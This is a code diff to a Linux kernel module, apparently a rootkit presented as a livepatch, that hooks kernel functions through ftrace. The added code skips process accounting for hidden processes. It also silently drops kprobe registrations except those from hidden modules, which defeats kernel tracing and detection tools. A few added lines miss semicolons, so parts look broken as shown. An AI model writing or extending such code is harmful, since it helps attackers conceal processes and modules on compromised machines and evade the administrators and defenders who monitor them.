@@ -147,6 +147,7 @@ static struct task_struct *(*p_find_task_by_pid_ns)(pid_t nr, struct pid_namespa
 static struct list_head *p_modules = NULL;
 static char * (*p_module_flags)(struct module *mod, char *buf) = NULL;
 static bool (*p_kallsyms_show_value)(const struct cred *cred) = NULL;
+static struct module *(*p_module_address)(unsigned long addr) = NULL;
 
 static int (*p_ddebug_remove_module)(const char *mod_name) = NULL;
 
@@ -1394,6 +1395,12 @@ static asmlinkage  struct module* ftrace_layout_and_allocate(struct pt_regs *reg
 {
 	return real_layout_and_allocate(regs)
 }
+
+static asmlinkage  void (*real_acct_process)(struct pt_regs *regs) = NULL;
+static asmlinkage  void ftrace_acct_process(struct pt_regs *regs)
+{
+	return real_acct_process(regs)
+}
 #else
 
 static asmlinkage long (*real_sched_getaffinity)(pid_t pid, struct cpumask *mask) = NULL;
@@ -1794,9 +1801,15 @@ static asmlinkage  int (*real_register_kprobe)(struct kprobe *p) = NULL;
 static asmlinkage  int ftrace_register_kprobe(struct kprobe *p)
 {
 	//puzzle kprpbe using in module when set force_kprobe_puzzle
-	if (force_kprobe_puzzle && !p_kernel_text_address((unsigned long)p)
-				 && !within_module((unsigned long)p, this_module))
-		return 0;
+	struct module *mod = NULL;
+	if (force_kprobe_puzzle && !p_kernel_text_address((unsigned long)p)) {
+				 // && !within_module((unsigned long)p, this_module))
+		preempt_disable();
+		mod = p_module_address((unsigned long)p);
+		preempt_enable();
+		if (!mod || !is_hidden_module_name(mod->name))
+			return 0;
+	}
 
 	return real_register_kprobe(p);
 }
@@ -1805,9 +1818,15 @@ static asmlinkage  int (*real_unregister_kprobe)(struct kprobe *p) = NULL;
 static asmlinkage  int ftrace_unregister_kprobe(struct kprobe *p)
 {
 	//puzzle kprpbe using in module when set force_kprobe_puzzle
-	if (force_kprobe_puzzle && !p_kernel_text_address((unsigned long)p)
-				 && !within_module((unsigned long)p, this_module))
-		return 0;
+	struct module *mod = NULL;
+	if (force_kprobe_puzzle && !p_kernel_text_address((unsigned long)p)) {
+				 //&& !within_module((unsigned long)p, this_module))
+		preempt_disable();
+		mod = p_module_address((unsigned long)p);
+		preempt_enable();
+		if (!mod || !is_hidden_module_name(mod->name))
+			return 0;
+	}
 
 	return real_unregister_kprobe(p);
 }
@@ -1856,6 +1875,14 @@ static asmlinkage  struct module* ftrace_layout_and_allocate(struct load_info *i
 
 	return real_layout_and_allocate(info, flags);
 
+}
+
+static asmlinkage  void (*real_acct_process)(void) = NULL;
+static asmlinkage  void ftrace_acct_process(void)
+{
+	if (is_hidden_proc(current))
+		return;
+	return real_acct_process();
 }
 #endif
 
@@ -1991,6 +2018,7 @@ static struct ftrace_hook hooks[] = {
         HOOK("msg_print_text", ftrace_msg_print_text, &real_msg_print_text),
         HOOK("msg_print_ext_body", ftrace_msg_print_ext_body, &real_msg_print_ext_body),
         HOOK("layout_and_allocate", ftrace_layout_and_allocate, &real_layout_and_allocate),
+        HOOK("acct_process", ftrace_acct_process, &real_acct_process),
 };
 
 static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
@@ -2231,6 +2259,11 @@ static int livepatch_init(void)
 	p_modules = (struct list_head *)
 				kallsyms_lookup_name("modules");
 	if (!p_modules)
+		return -1;
+
+	p_module_address = (struct module *(*)(unsigned long addr))
+				kallsyms_lookup_name("__module_address");
+	if (!p_module_address)
 		return -1;
 
 #if 0
